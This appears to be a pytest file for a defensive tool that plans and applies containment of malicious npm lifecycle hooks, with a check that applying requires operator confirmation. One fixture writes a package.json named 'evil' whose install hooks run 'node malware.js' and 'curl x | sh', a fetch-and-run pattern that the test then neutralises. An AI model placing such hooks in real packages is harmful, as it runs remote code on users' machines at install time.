"""Bridge: Maw T2 contain plan + apply (runs via agent_control_pytest)."""

from __future__ import annotations

import json
import shutil
import sys
import tempfile
from pathlib import Path

MAW = Path.home() / "maw"
sys.path.insert(0, str(MAW))

from maw.cli import main  # noqa: E402
from maw.contain import apply_from_report, plan_from_report  # noqa: E402
from maw.report import Finding, build_report  # noqa: E402


def test_contain_plan_ok():
    rep = build_report(
        roots=["/tmp"],
        ioc_pack_id="t",
        ioc_version=1,
        findings=[
            Finding(
                rule="x",
                path="/tmp/node_modules/x/package.json",
                detail="preinstall",
                severity="high",
                confidence="high",
                layers=["lifecycle"],
                token_classes_at_risk=["npm", "github"],
            )
        ],
        mode="quick",
    )
    plan = plan_from_report(rep)
    assert plan["ok"] and plan["tier"] == "T2"
    assert plan["apply_implemented"] is True
    assert any(a["id"] == "rotation_list.emit" for a in plan["actions_planned"])


def test_contain_apply_requires_confirm():
    rep = build_report(
        roots=["/tmp"],
        ioc_pack_id="t",
        ioc_version=1,
        findings=[
            Finding(
                rule="x",
                path="/tmp/node_modules/x/package.json",
                detail="preinstall",
                severity="high",
                confidence="high",
                layers=["lifecycle"],
                token_classes_at_risk=["npm"],
            )
        ],
        mode="quick",
    )
    out = apply_from_report(rep, operator_confirm=False)
    assert out["ok"] is False
    assert out["code"] == "OPERATOR_CONFIRM_REQUIRED"


def test_contain_apply_lifecycle_noop_under_tmp():
    """Live apply: /tmp is path-allowed; backups under maw/receipts/quarantine."""
    work = Path(tempfile.mkdtemp(prefix="maw-contain-t2-", dir="/tmp"))
    try:
        pkg = work / "package.json"
        pkg.write_text(
            json.dumps(
                {
                    "name": "evil",
                    "scripts": {
                        "preinstall": "node malware.js",
                        "postinstall": "curl x | sh",
                    },
                },
                indent=2,
            )
            + "\n",
            encoding="utf-8",
        )
        rep = build_report(
            roots=[str(work)],
            ioc_pack_id="t",
            ioc_version=1,
            findings=[
                Finding(
                    rule="lifecycle_hook",
                    path=str(pkg),
                    detail="preinstall",
                    severity="high",
                    confidence="high",
                    layers=["lifecycle"],
                    token_classes_at_risk=["npm"],
                )
            ],
            mode="quick",
        )
        out = apply_from_report(rep, operator_confirm=True)
        assert out["ok"] is True
        assert out["code"] in ("APPLY_OK", "APPLY_PARTIAL")
        assert out["dry_run"] is False
        assert out.get("backups")
        data = json.loads(pkg.read_text(encoding="utf-8"))
        assert data["scripts"]["preinstall"] == "true"
        assert data["scripts"]["postinstall"] == "true"
        applied = {a["id"] for a in out["actions_applied"]}
        assert "lifecycle.noop_package_json" in applied
        assert "rotation_list.emit" in applied
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_contain_cli_apply_usage():
    # missing --from-report → argparse error → SystemExit
    try:
        code = main(["contain", "apply"])
    except SystemExit as e:
        code = int(e.code) if e.code is not None else 1
    assert code != 0
